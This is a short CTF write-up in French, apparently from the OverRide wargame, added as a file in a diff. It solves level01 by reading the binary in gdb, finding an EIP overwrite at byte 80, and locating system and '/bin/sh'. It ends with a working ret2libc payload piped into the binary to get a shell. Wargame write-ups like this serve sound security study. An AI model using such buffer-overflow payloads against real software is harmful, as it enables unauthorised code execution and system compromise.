@@ -1,0 +1,48 @@
+En analysant le binaire avec gdb on remarque qu'il y a trois fonctions:
+main
+verify_user_name
+verify_user_pass
+
+En s'intéressant à verify_user_name on voit qu'il fait une comparaison avec dat_will
+de même avec verify_user_pass; il y a une comparaison avec admin
+
+On test donc cette combinaison
+
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+admin
+nope, incorrect password...
+
+Il semblerait que le programme renvoit "nope, incorrect password..." dans tous les cas, et de toute façon le programme ne fait pas de call à system, donc on ira pas très loin...
+
+On essaye de voir si on peut get un segfault quelque part avec un EIP.
+
+Après plusieurs test, et grâce à un pattern generator pour buffer overflow, on remarque qu'on a bien un EIP au byte80 sur le second fgets.
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+system adresse: 0xf7e6aed0
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+/bin/sh adresse: 0xf7f897ec
+
+
+On a donc un EIP, une adresse pour system, une adresse pour /bin/sh, on peut réaliser un ret2libc attack.
+
+
+python -c 'print "dat_will" + "\n" + "" +  "A" * 80 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"' > /tmp/level01
+cat /tmp/level01 - | ./level01
